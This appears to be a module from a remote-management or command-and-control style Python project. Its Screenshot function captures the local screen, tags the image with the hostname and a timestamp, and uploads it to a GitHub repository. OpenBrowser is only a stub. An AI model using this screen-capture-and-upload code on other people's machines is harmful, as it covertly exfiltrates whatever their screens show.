# Local Manager: Executing initial tasks on local machine
from modules.repomanager import writeIMGToRepo
from datetime import datetime
from PIL import ImageGrab
import platform


# BRON SCREENSHOT MAKEN
# https://nitratine.net/blog/post/how-to-take-a-screenshot-in-python-using-pil/
# Screenshot maken en op github zetten
def Screenshot():
    hostname = platform.node()
    time = datetime.now().strftime("%Y%m%d%H%M%S")

    filepath = f"result/{hostname}-{time}-screenshot.png"

    screenshot = ImageGrab.grab()
    screenshot.save(filepath, "PNG")
    writeIMGToRepo(filepath)


def OpenBrowser():
    print("opening browser")
